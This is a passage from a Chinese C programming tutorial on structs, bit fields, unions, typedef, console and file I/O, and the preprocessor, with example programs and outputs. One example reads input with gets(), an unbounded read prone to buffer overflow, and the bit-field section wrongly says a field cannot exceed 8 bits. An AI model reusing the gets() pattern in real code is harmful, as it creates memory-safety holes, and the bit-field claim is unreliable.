s1; //此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//结构体的标签被命名为SIMPLE,没有声明变量struct SIMPLE&#123; int a; char b; double c;&#125;;//用SIMPLE标签的结构体，另外声明了变量t1、t2、t3struct SIMPLE t1, t2[20], *t3; //也可以用typedef创建新类型typedef struct&#123; int a; char b; double c; &#125; Simple2;//现在可以用Simple2作为类型声明新的结构体变量Simple2 u1, u2[20], *u3; 在上面的声明中，第一个和第二声明被编译器当作两个完全不同的类型，即使他们的成员列表是一样的，如果令 t3=&amp;s1，则是非法的。 结构体的成员可以包含其他结构体，也可以包含指向自己结构体类型的指针，而通常这种指针的应用是为了实现一些更高级的数据结构如链表和树等。 12345678910111213//此结构体的声明包含了其他的结构体struct COMPLEX&#123; char string[100]; struct SIMPLE a;&#125;; //此结构体的声明包含了指向自己类型的指针struct NODE&#123; char string[100]; struct NODE *next_node;&#125;; 如果两个结构体互相包含，则需要对其中一个结构体进行不完整声明，如下所示： 123456789101112131415struct B; //对结构体B进行不完整声明 //结构体A中包含指向结构体B的指针struct A&#123; struct B *partner; //other members;&#125;; //结构体B中包含指向结构体A的指针，在A声明完后，B也随之进行声明struct B&#123; struct A *partner; //other members;&#125;; 结构体变量的初始化和其它类型变量一样，对结构体变量可以在定义时指定初始值。 实例 1234567891011121314#include &lt;stdio.h&gt; struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; book = &#123;\"C 语言\", \"RUNOOB\", \"编程语言\", 123456&#125;; int main()&#123; printf(\"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", book.title, book.author, book.subject, book.book_id);&#125; 执行输出结果为： 1234title : C 语言author: RUNOOBsubject: 编程语言book_id: 123456 访问结构成员 为了访问结构的成员，我们使用成员访问运算符（.）。成员访问运算符是结构变量名称和我们要访问的结构成员之间的一个句号。您可以使用 struct 关键字来定义结构类型的变量。下面的实例演示了结构的用法： 实例 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;string.h&gt; struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;; int main( )&#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy( Book1.title, \"C Programming\"); strcpy( Book1.author, \"Nuha Ali\"); strcpy( Book1.subject, \"C Programming Tutorial\"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy( Book2.title, \"Telecom Billing\"); strcpy( Book2.author, \"Zara Ali\"); strcpy( Book2.subject, \"Telecom Billing Tutorial\"); Book2.book_id = 6495700; /* 输出 Book1 信息 */ printf( \"Book 1 title : %s\\n\", Book1.title); printf( \"Book 1 author : %s\\n\", Book1.author); printf( \"Book 1 subject : %s\\n\", Book1.subject); printf( \"Book 1 book_id : %d\\n\", Book1.book_id); /* 输出 Book2 信息 */ printf( \"Book 2 title : %s\\n\", Book2.title); printf( \"Book 2 author : %s\\n\", Book2.author); printf( \"Book 2 subject : %s\\n\", Book2.subject); printf( \"Book 2 book_id : %d\\n\", Book2.book_id); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12345678Book 1 title : C ProgrammingBook 1 author : Nuha AliBook 1 subject : C Programming TutorialBook 1 book_id : 6495407Book 2 title : Telecom BillingBook 2 author : Zara AliBook 2 subject : Telecom Billing TutorialBook 2 book_id : 6495700 结构作为参数 您可以把结构作为函数参数，传参方式与其他类型的变量或指针类似。您可以使用上面实例中的方式来访问结构变量： 实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;string.h&gt; struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;; /* 函数声明 */void printBook( struct Books book );int main( )&#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy( Book1.title, \"C Programming\"); strcpy( Book1.author, \"Nuha Ali\"); strcpy( Book1.subject, \"C Programming Tutorial\"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy( Book2.title, \"Telecom Billing\"); strcpy( Book2.author, \"Zara Ali\"); strcpy( Book2.subject, \"Telecom Billing Tutorial\"); Book2.book_id = 6495700; /* 输出 Book1 信息 */ printBook( Book1 ); /* 输出 Book2 信息 */ printBook( Book2 ); return 0;&#125;void printBook( struct Books book )&#123; printf( \"Book title : %s\\n\", book.title); printf( \"Book author : %s\\n\", book.author); printf( \"Book subject : %s\\n\", book.subject); printf( \"Book book_id : %d\\n\", book.book_id);&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12345678Book title : C ProgrammingBook author : Nuha AliBook subject : C Programming TutorialBook book_id : 6495407Book title : Telecom BillingBook author : Zara AliBook subject : Telecom Billing TutorialBook book_id : 6495700 指向结构的指针您可以定义指向结构的指针，方式与定义指向其他类型变量的指针相似，如下所示： 1struct Books *struct_pointer; 现在，您可以在上述定义的指针变量中存储结构变量的地址。为了查找结构变量的地址，请把 &amp; 运算符放在结构名称的前面，如下所示： 1struct_pointer = &amp;Book1; 为了使用指向该结构的指针访问结构的成员，您必须使用 -&gt; 运算符，如下所示： 1struct_pointer-&gt;title; 让我们使用结构指针来重写上面的实例，这将有助于您理解结构指针的概念： 实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;string.h&gt; struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;; /* 函数声明 */void printBook( struct Books *book );int main( )&#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy( Book1.title, \"C Programming\"); strcpy( Book1.author, \"Nuha Ali\"); strcpy( Book1.subject, \"C Programming Tutorial\"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy( Book2.title, \"Telecom Billing\"); strcpy( Book2.author, \"Zara Ali\"); strcpy( Book2.subject, \"Telecom Billing Tutorial\"); Book2.book_id = 6495700; /* 通过传 Book1 的地址来输出 Book1 信息 */ printBook( &amp;Book1 ); /* 通过传 Book2 的地址来输出 Book2 信息 */ printBook( &amp;Book2 ); return 0;&#125;void printBook( struct Books *book )&#123; printf( \"Book title : %s\\n\", book-&gt;title); printf( \"Book author : %s\\n\", book-&gt;author); printf( \"Book subject : %s\\n\", book-&gt;subject); printf( \"Book book_id : %d\\n\", book-&gt;book_id);&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12345678Book title : C ProgrammingBook author : Nuha AliBook subject : C Programming TutorialBook book_id : 6495407Book title : Telecom BillingBook author : Zara AliBook subject : Telecom Billing TutorialBook book_id : 6495700 位域有些信息在存储时，并不需要占用一个完整的字节，而只需占几个或一个二进制位。例如在存放一个开关量时，只有 0 和 1 两种状态，用 1 位二进位即可。为了节省存储空间，并使处理简便，C 语言又提供了一种数据结构，称为”位域”或”位段”。 所谓”位域”是把一个字节中的二进位划分为几个不同的区域，并说明每个区域的位数。每个域有一个域名，允许在程序中按域名进行操作。这样就可以把几个不同的对象用一个字节的二进制位域来表示。 典型的实例： 用 1 位二进位存放一个开关量时，只有 0 和 1 两种状态。 读取外部文件格式——可以读取非标准的文件格式。例如：9 位的整数。 位域的定义和位域变量的说明位域定义与结构定义相仿，其形式为： 123456struct 位域结构名 &#123; 位域列表&#125;; 其中位域列表的形式为： 1类型说明符 位域名: 位域长度 例如： 12345struct bs&#123; int a:8; int b:2; int c:6;&#125;data; 说明 data 为 bs 变量，共占两个字节。其中位域 a 占 8 位，位域 b 占 2 位，位域 c 占 6 位。 让我们再来看一个实例： 12345678struct packed_struct &#123; unsigned int f1:1; unsigned int f2:1; unsigned int f3:1; unsigned int f4:1; unsigned int type:4; unsigned int my_int:9;&#125; pack; 在这里，packed_struct 包含了 6 个成员：四个 1 位的标识符 f1..f4、一个 4 位的 type 和一个 9 位的 my_int。 对于位域的定义尚有以下几点说明： 一个位域存储在同一个字节中，如一个字节所剩空间不够存放另一位域时，则会从下一单元起存放该位域。也可以有意使某位域从下一单元开始。例如： 123456struct bs&#123; unsigned a:4; unsigned :4; /* 空域 */ unsigned b:4; /* 从下一单元开始存放 */ unsigned c:4&#125; 在这个位域定义中，a 占第一字节的 4 位，后 4 位填 0 表示不使用，b 从第二字节开始，占用 4 位，c 占用 4 位。 由于位域不允许跨两个字节，因此位域的长度不能大于一个字节的长度，也就是说不能超过8位二进位。如果最大长度大于计算机的整数字长，一些编译器可能会允许域的内存重叠，另外一些编译器可能会把大于一个域的部分存储在下一个字中。 位域可以是无名位域，这时它只用来作填充或调整位置。无名的位域是不能使用的。例如： 123456struct k&#123; int a:1; int :2; /* 该 2 位不能使用 */ int b:3; int c:2;&#125;; 从以上分析可以看出，位域在本质上就是一种结构类型，不过其成员是按二进位分配的。 位域的使用位域的使用和结构成员的使用相同，其一般形式为： 12位域变量名.位域名位域变量名-&gt;位域名 位域允许用各种格式输出。 请看下面的实例： 12345678910111213141516main()&#123; struct bs&#123; unsigned a:1; unsigned b:3; unsigned c:4; &#125; bit,*pbit; bit.a=1; /* 给位域赋值（应注意赋值不能超过该位域的允许范围） */ bit.b=7; /* 给位域赋值（应注意赋值不能超过该位域的允许范围） */ bit.c=15; /* 给位域赋值（应注意赋值不能超过该位域的允许范围） */ printf(\"%d,%d,%d\\n\",bit.a,bit.b,bit.c); /* 以整型量格式输出三个域的内容 */ pbit=&amp;bit; /* 把位域变量 bit 的地址送给指针变量 pbit */ pbit-&gt;a=0; /* 用指针方式给位域 a 重新赋值，赋为 0 */ pbit-&gt;b&amp;=3; /* 使用了复合的位运算符 \"&amp;=\"，相当于：pbit-&gt;b=pbit-&gt;b&amp;3，位域 b 中原有值为 7，与 3 作按位与运算的结果为 3（111&amp;011=011，十进制值为 3） */ pbit-&gt;c|=1; /* 使用了复合位运算符\"|=\"，相当于：pbit-&gt;c=pbit-&gt;c|1，其结果为 15 */ printf(\"%d,%d,%d\\n\",pbit-&gt;a,pbit-&gt;b,pbit-&gt;c); /* 用指针方式输出了这三个域的值 */&#125; 上例程序中定义了位域结构 bs，三个位域为 a、b、c。说明了 bs 类型的变量 bit 和指向 bs 类型的指针变量 pbit。这表示位域也是可以使用指针的。 C 共用体 共用体是一种特殊的数据类型，允许您在相同的内存位置存储不同的数据类型。您可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值。共用体提供了一种使用相同的内存位置的有效方式。 定义共用体为了定义共用体，您必须使用 union 语句，方式与定义结构类似。union 语句定义了一个新的数据类型，带有多个成员。union 语句的格式如下： 1234567union [union tag]&#123; member definition; member definition; ... member definition;&#125; [one or more union variables]; union tag 是可选的，每个 member definition 是标准的变量定义，比如 int i; 或者 float f; 或者其他有效的变量定义。在共用体定义的末尾，最后一个分号之前，您可以指定一个或多个共用体变量，这是可选的。下面定义一个名为 Data 的共用体类型，有三个成员 i、f 和 str： 123456union Data&#123; int i; float f; char str[20];&#125; data; 现在，Data 类型的变量可以存储一个整数、一个浮点数，或者一个字符串。这意味着一个变量（相同的内存位置）可以存储多个多种类型的数据。您可以根据需要在一个共用体内使用任何内置的或者用户自定义的数据类型。 共用体占用的内存应足够存储共用体中最大的成员。例如，在上面的实例中，Data 将占用 20 个字节的内存空间，因为在各个成员中，字符串所占用的空间是最大的。下面的实例将显示上面的共用体占用的总内存大小： 实例 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt; union Data&#123; int i; float f; char str[20];&#125;; int main( )&#123; union Data data; printf( \"Memory size occupied by data : %d\\n\", sizeof(data)); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Memory size occupied by data : 20 访问共用体成员 为了访问共用体的成员，我们使用成员访问运算符（.）。成员访问运算符是共用体变量名称和我们要访问的共用体成员之间的一个句号。您可以使用 union 关键字来定义共用体类型的变量。下面的实例演示了共用体的用法： 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt; union Data&#123; int i; float f; char str[20];&#125;; int main( )&#123; union Data data; data.i = 10; data.f = 220.5; strcpy( data.str, \"C Programming\"); printf( \"data.i : %d\\n\", data.i); printf( \"data.f : %f\\n\", data.f); printf( \"data.str : %s\\n\", data.str); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123data.i : 1917853763data.f : 4122360580327794860452759994368.000000data.str : C Programming 在这里，我们可以看到共用体的 i 和 f 成员的值有损坏，因为最后赋给变量的值占用了内存位置，这也是 str 成员能够完好输出的原因。现在让我们再来看一个相同的实例，这次我们在同一时间只使用一个变量，这也演示了使用共用体的主要目的： 实例 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;string.h&gt; union Data&#123; int i; float f; char str[20];&#125;; int main( )&#123; union Data data; data.i = 10; printf( \"data.i : %d\\n\", data.i); data.f = 220.5; printf( \"data.f : %f\\n\", data.f); strcpy( data.str, \"C Programming\"); printf( \"data.str : %s\\n\", data.str); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123data.i : 10data.f : 220.500000data.str : C Programming 在这里，所有的成员都能完好输出，因为同一时间只用到一个成员。 C 位域 如果程序的结构中包含多个开关量，只有 TRUE/FALSE 变量，如下： 12345struct&#123; unsigned int widthValidated; unsigned int heightValidated;&#125; status; 这种结构需要 8 字节的内存空间，但在实际上，在每个变量中，我们只存储 0 或 1。在这种情况下，C 语言提供了一种更好的利用内存空间的方式。如果您在结构内使用这样的变量，您可以定义变量的宽度来告诉编译器，您将只使用这些字节。例如，上面的结构可以重写成： 12345struct&#123; unsigned int widthValidated : 1; unsigned int heightValidated : 1;&#125; status; 现在，上面的结构中，status 变量将占用 4 个字节的内存空间，但是只有 2 位被用来存储值。如果您用了 32 个变量，每一个变量宽度为 1 位，那么 status 结构将使用 4 个字节，但只要您再多用一个变量，如果使用了 33 个变量，那么它将分配内存的下一段来存储第 33 个变量，这个时候就开始使用 8 个字节。让我们看看下面的实例来理解这个概念： 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt; /* 定义简单的结构 */struct&#123; unsigned int widthValidated; unsigned int heightValidated;&#125; status1; /* 定义位域结构 */struct&#123; unsigned int widthValidated : 1; unsigned int heightValidated : 1;&#125; status2; int main( )&#123; printf( \"Memory size occupied by status1 : %d\\n\", sizeof(status1)); printf( \"Memory size occupied by status2 : %d\\n\", sizeof(status2)); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12Memory size occupied by status1 : 8Memory size occupied by status2 : 4 位域声明在结构内声明位域的形式如下： 1234struct&#123; type [member_name] : width ;&#125;; 下面是有关位域中变量元素的描述： 元素 描述 type 整数类型，决定了如何解释位域的值。类型可以是整型、有符号整型、无符号整型。 member_name 位域的名称。 width 位域中位的数量。宽度必须小于或等于指定类型的位宽度。 带有预定义宽度的变量被称为位域。位域可以存储多于 1 位的数，例如，需要一个变量来存储从 0 到 7 的值，您可以定义一个宽度为 3 位的位域，如下： 1234struct&#123; unsigned int age : 3;&#125; Age; 上面的结构定义指示 C 编译器，age 变量将只使用 3 位来存储这个值，如果您试图使用超过 3 位，则无法完成。让我们来看下面的实例： 实例 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt; struct&#123; unsigned int age : 3;&#125; Age; int main( )&#123; Age.age = 4; printf( \"Sizeof( Age ) : %d\\n\", sizeof(Age) ); printf( \"Age.age : %d\\n\", Age.age ); Age.age = 7; printf( \"Age.age : %d\\n\", Age.age ); Age.age = 8; // 二进制表示为 1000 有四位，超出 printf( \"Age.age : %d\\n\", Age.age ); return 0;&#125; 当上面的代码被编译时，它会带有警告，当上面的代码被执行时，它会产生下列结果： 1234Sizeof( Age ) : 4Age.age : 4Age.age : 7Age.age : 0 C typedef​ C 语言提供了 typedef 关键字，您可以使用它来为类型取一个新的名字。下面的实例为单字节数字定义了一个术语 BYTE： 1typedef unsigned char BYTE; 在这个类型定义之后，标识符 BYTE 可作为类型 unsigned char 的缩写，例如： 1BYTE b1, b2; 按照惯例，定义时会大写字母，以便提醒用户类型名称是一个象征性的缩写，但您也可以使用小写字母，如下： 1typedef unsigned char byte; 您也可以使用 typedef 来为用户自定义的数据类型取一个新的名字。例如，您可以对结构体使用 typedef 来定义一个新的数据类型名字，然后使用这个新的数据类型来直接定义结构变量，如下： 实例 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;string.h&gt; typedef struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; Book; int main( )&#123; Book book; strcpy( book.title, \"C 教程\"); strcpy( book.author, \"Runoob\"); strcpy( book.subject, \"编程语言\"); book.book_id = 12345; printf( \"书标题 : %s\\n\", book.title); printf( \"书作者 : %s\\n\", book.author); printf( \"书类目 : %s\\n\", book.subject); printf( \"书 ID : %d\\n\", book.book_id); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1234书标题 : C 教程书作者 : Runoob书类目 : 编程语言书 ID : 12345 typedef vs #define#define 是 C 指令，用于为各种数据类型定义别名，与 typedef 类似，但是它们有以下几点不同： typedef 仅限于为类型定义符号名称，#define 不仅可以为类型定义别名，也能为数值定义别名，比如您可以定义 1 为 ONE。 typedef 是由编译器执行解释的，#define 语句是由预编译器进行处理的。 下面是 #define 的最简单的用法： 实例 123456789101112#include &lt;stdio.h&gt; #define TRUE 1#define FALSE 0 int main( )&#123; printf( \"TRUE 的值: %d\\n\", TRUE); printf( \"FALSE 的值: %d\\n\", FALSE); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12TRUE 的值: 1FALSE 的值: 0 C 输入 &amp; 输出当我们提到输入时，这意味着要向程序填充一些数据。输入可以是以文件的形式或从命令行中进行。C 语言提供了一系列内置的函数来读取给定的输入，并根据需要填充到程序中。 当我们提到输出时，这意味着要在屏幕上、打印机上或任意文件中显示一些数据。C 语言提供了一系列内置的函数来输出数据到计算机屏幕上和保存数据到文本文件或二进制文件中。 标准文件C 语言把所有的设备都当作文件。所以设备（比如显示器）被处理的方式与文件相同。以下三个文件会在程序执行时自动打开，以便访问键盘和屏幕。 标准文件 文件指针 设备 标准输入 stdin 键盘 标准输出 stdout 屏幕 标准错误 stderr 您的屏幕 文件指针是访问文件的方式，本节将讲解如何从屏幕读取值以及如何把结果输出到屏幕上。 C 语言中的 I/O (输入/输出) 通常使用 printf() 和 scanf() 两个函数。 scanf() 函数用于从标准输入（键盘）读取并格式化， printf() 函数发送格式化输出到标准输出（屏幕）。 实例 123456#include &lt;stdio.h&gt; // 执行 printf() 函数需要该库int main()&#123; printf(\"菜鸟教程\"); //显示引号中的内容 return 0;&#125; 编译以上程序，输出结果为： 1菜鸟教程 实例解析： 所有的 C 语言程序都需要包含 main() 函数。 代码从 main() 函数开始执行。 printf() 用于格式化输出到屏幕。printf() 函数在 “stdio.h” 头文件中声明。 stdio.h 是一个头文件 (标准输入输出头文件) and #include 是一个预处理命令，用来引入头文件。 当编译器遇到 printf() 函数时，如果没有找到 stdio.h 头文件，会发生编译错误。 return 0; 语句用于表示退出程序。 %d 格式化输出整数 1234567#include &lt;stdio.h&gt;int main()&#123; int testInteger = 5; printf(\"Number = %d\", testInteger); return 0;&#125; 编译以上程序，输出结果为： 1Number = 5 在 printf() 函数的引号中使用 “%d” (整型) 来匹配整型变量 testInteger 并输出到屏幕。 %f 格式化输出浮点型数据 12345678910#include &lt;stdio.h&gt;int main()&#123; float f; printf(\"Enter a number: \"); // %f 匹配浮点型数据 scanf(\"%f\",&amp;f); printf(\"Value = %f\", f); return 0;&#125; getchar() &amp; putchar() 函数int getchar(void) 函数从屏幕读取下一个可用的字符，并把它返回为一个整数。这个函数在同一个时间内只会读取一个单一的字符。您可以在循环内使用这个方法，以便从屏幕上读取多个字符。 int putchar(int c) 函数把字符输出到屏幕上，并返回相同的字符。这个函数在同一个时间内只会输出一个单一的字符。您可以在循环内使用这个方法，以便在屏幕上输出多个字符。 请看下面的实例： 实例 1234567891011121314#include &lt;stdio.h&gt; int main( )&#123; int c; printf( \"Enter a value :\"); c = getchar( ); printf( \"\\nYou entered: \"); putchar( c ); printf( \"\\n\"); return 0;&#125; 当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并只会读取一个单一的字符，显示如下： 1234$./a.outEnter a value :runoobYou entered: r gets() &amp; puts() 函数char *gets(char *s) 函数从 stdin 读取一行到 s 所指向的缓冲区，直到一个终止符或 EOF。 int puts(const char *s) 函数把字符串 s 和一个尾随的换行符写入到 stdout。 实例 12345678910111213#include &lt;stdio.h&gt; int main( )&#123; char str[100]; printf( \"Enter a value :\"); gets( str ); printf( \"\\nYou entered: \"); puts( str ); return 0;&#125; 当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取一整行直到该行结束，显示如下： 1234$./a.outEnter a value :runoobYou entered: runoob scanf() 和 printf() 函数int scanf(const char *format, …) 函数从标准输入流 stdin 读取输入，并根据提供的 format 来浏览输入。 int printf(const char *format, …) 函数把输出写入到标准输出流 stdout ，并根据提供的格式产生输出。 format 可以是一个简单的常量字符串，但是您可以分别指定 %s、%d、%c、%f 等来输出或读取字符串、整数、字符或浮点数。还有许多其他可用的格式选项，可以根据需要使用。如需了解完整的细节，可以查看这些函数的参考手册。现在让我们通过下面这个简单的实例来加深理解： 实例 12345678910111213#include &lt;stdio.h&gt;int main( ) &#123; char str[100]; int i; printf( \"Enter a value :\"); scanf(\"%s %d\", str, &amp;i); printf( \"\\nYou entered: %s %d \", str, i); printf(\"\\n\"); return 0;&#125; 当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取输入，显示如下： 1234$./a.outEnter a value :runoob 123You entered: runoob 123 在这里，应当指出的是，scanf() 期待输入的格式与您给出的 %s 和 %d 相同，这意味着您必须提供有效的输入，比如 “string integer”，如果您提供的是 “string string” 或 “integer integer”，它会被认为是错误的输入。另外，在读取字符串时，只要遇到一个空格，scanf() 就会停止读取，所以 “this is test” 对 scanf() 来说是三个字符串。 C 文件读写上一章我们讲解了 C 语言处理的标准输入和输出设备。本章我们将介绍 C 程序员如何创建、打开、关闭文本文件或二进制文件。 一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。C 语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。本章将讲解文件管理的重要调用。 打开文件您可以使用 fopen( ) 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 FILE 的一个对象，类型 FILE 包含了所有用来控制流的必要的信息。下面是这个函数调用的原型： 1FILE *fopen( const char * filename, const char * mode ); 在这里，filename 是字符串，用来命名文件，访问模式 mode 的值可以是下列值中的一个： 模式 描述 r 打开一个已有的文本文件，允许读取文件。 w 打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。 a 打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。 r+ 打开一个文本文件，允许读写文件。 w+ 打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。 a+ 打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。 如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式： 1\"rb\", \"wb\", \"ab\", \"rb+\", \"r+b\", \"wb+\", \"w+b\", \"ab+\", \"a+b\" 关闭文件为了关闭文件，请使用 fclose( ) 函数。函数的原型如下： 1int fclose( FILE *fp ); 如果成功关闭文件，fclose( ) 函数返回零，如果关闭文件时发生错误，函数返回 EOF。这个函数实际上，会清空缓冲区中的数据，关闭文件，并释放用于该文件的所有内存。EOF 是一个定义在头文件 stdio.h 中的常量。 C 标准库提供了各种函数来按字符或者以固定长度字符串的形式读写文件。 写入文件下面是把字符写入到流中的最简单的函数： 1int fputc( int c, FILE *fp ); 函数 fputc() 把参数 c 的字符值写入到 fp 所指向的输出流中。如果写入成功，它会返回写入的字符，如果发生错误，则会返回 EOF。您可以使用下面的函数来把一个以 null 结尾的字符串写入到流中： 1int fputs( const char *s, FILE *fp ); 函数 fputs() 把字符串 s 写入到 fp 所指向的输出流中。如果写入成功，它会返回一个非负值，如果发生错误，则会返回 EOF。您也可以使用 int fprintf(FILE *fp,const char *format, …) 函数来写把一个字符串写入到文件中。尝试下面的实例： 注意：请确保您有可用的 tmp 目录，如果不存在该目录，则需要在您的计算机上先创建该目录。 /tmp 一般是 Linux 系统上的临时目录，如果你在 Windows 系统上运行，则需要修改为本地环境中已存在的目录，例如: C:\\tmp、D:\\tmp等。 实例 1234567891011#include &lt;stdio.h&gt; int main()&#123; FILE *fp = NULL; fp = fopen(\"/tmp/test.txt\", \"w+\"); fprintf(fp, \"This is testing for fprintf...\\n\"); fputs(\"This is testing for fputs...\\n\", fp); fclose(fp);&#125; 当上面的代码被编译和执行时，它会在 /tmp 目录中创建一个新的文件 test.txt，并使用两个不同的函数写入两行。接下来让我们来读取这个文件。 读取文件下面是从文件读取单个字符的最简单的函数： 1int fgetc( FILE * fp ); fgetc() 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符，如果发生错误则返回 EOF。下面的函数允许您从流中读取一个字符串： 1char *fgets( char *buf, int n, FILE *fp ); 函数 fgets() 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 buf，并在最后追加一个 null 字符来终止字符串。 如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。您也可以使用 int fscanf(FILE *fp, const char *format, …) 函数来从文件中读取字符串，但是在遇到第一个空格字符时，它会停止读取。 实例 12345678910111213141516171819#include &lt;stdio.h&gt; int main()&#123; FILE *fp = NULL; char buff[255]; fp = fopen(\"/tmp/test.txt\", \"r\"); fscanf(fp, \"%s\", buff); printf(\"1: %s\\n\", buff ); fgets(buff, 255, (FILE*)fp); printf(\"2: %s\\n\", buff ); fgets(buff, 255, (FILE*)fp); printf(\"3: %s\\n\", buff ); fclose(fp); &#125; 当上面的代码被编译和执行时，它会读取上一部分创建的文件，产生下列结果： 12341: This2: is testing for fprintf...3: This is testing for fputs... 首先，fscanf() 方法只读取了 This，因为它在后边遇到了一个空格。其次，调用 fgets() 读取剩余的部分，直到行尾。最后，调用 fgets() 完整地读取第二行。 二进制 I/O 函数下面两个函数用于二进制输入和输出： 12345size_t fread(void *ptr, size_t size_of_elements, size_t number_of_elements, FILE *a_file); size_t fwrite(const void *ptr, size_t size_of_elements, size_t number_of_elements, FILE *a_file); 这两个函数都是用于存储块的读写 - 通常是数组或结构体。 C 预处理器C 预处理器不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。我们将把 C 预处理器（C Preprocessor）简写为 CPP。 所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。下面列出了所有重要的预处理器指令： 指令 描述 #define 定义宏 #include 包含一个源代码文件 #undef 取消已定义的宏 #ifdef 如果宏已经定义，则返回真 #ifndef 如果宏没有定义，则返回真 #if 如果给定条件为真，则编译下面代码 #else #if 的替代方案 #elif 如果前面的 #if 给定条件不为真，当前条件为真，则编译下面代码 #endif 结束一个 #if……#else 条件编译块 #error 当遇到标准错误时，输出错误消息 #pragma 使用标准化方法，向编译器发布特殊的命令到编译器中 预处理器实例分析下面的实例来理解不同的指令。 1#define MAX_ARRAY_LENGTH 20 这个指令告诉 CPP 把所有的 MAX_ARRAY_LENGTH 替换为 20。使用 #define 定义常量来增强可读性。 12#include &lt;stdio.h&gt;#include \"myheader.h\" 这些指令告诉 CPP 从系统库中获取 stdio.h，并添加文本到当前的源文件中。下一行告诉 CPP 从本地目录中获取 myheader.h，并添加内容到当前的源文件中。 12#undef FILE_SIZE#define FILE_SIZE 42 这个指令告诉 CPP 取消已定义的 FILE_SIZE，并定义它为 42。 123#ifndef MESSAGE #define MESSAGE \"You wish!\"#endif 这个指令告诉 CPP 只有当 MESSAGE 未定义时，才定义 MESSAGE。 123#ifdef DEBUG /* Your debugging statements here */#endif 这个指令告诉 CPP 如果定义了 DEBUG，则执行处理语句。在编译时，如果您向 gcc 编译器传递了 -DDEBUG 开关量，这个指令就非常有用。它定义了 DEBUG，您可以在编译期间随时开启或关闭调试。 预定义宏ANSI C 定义了许多宏。在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏。 宏 描述 DATE 当前日期，一个以 “MMM DD YYYY” 格式表示的字符常量。 TIME 当前时间，一个以 “HH:MM:SS” 格式表示的字符常量。 FILE 这会包含当前文件名，一个字符串常量。 LINE 这会包含当前行号，一个十进制常量。 STDC 当编译器以 ANSI 标准编译时，则定义为 1。 让我们来尝试下面的实例： 1234567891011#include &lt;stdio.h&gt;main()&#123; printf(\"File :%s\\n\", __FILE__ ); printf(\"Date :%s\\n\", __DATE__ ); printf(\"Time :%s\\n\", __TIME__ ); printf(\"Line :%d\\n\", __LINE__ ); printf(\"ANSI :%d\\n\", __STDC__ );&#125; 当上面的代码（在文件 test.c 中）被编译和执行时，它会产生下列结果： 12345File :test.cDate :Jun 2 2012Time :03:36:24Line :8ANSI :1 预处理器运算符C 预处理器提供了下列的运算符来帮助您创建宏： 宏延续运算符（\\）一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（\\）。例如： 12#define message_for(a, b) \\ printf(#a \" and \" #b \": We love you!\\n\") 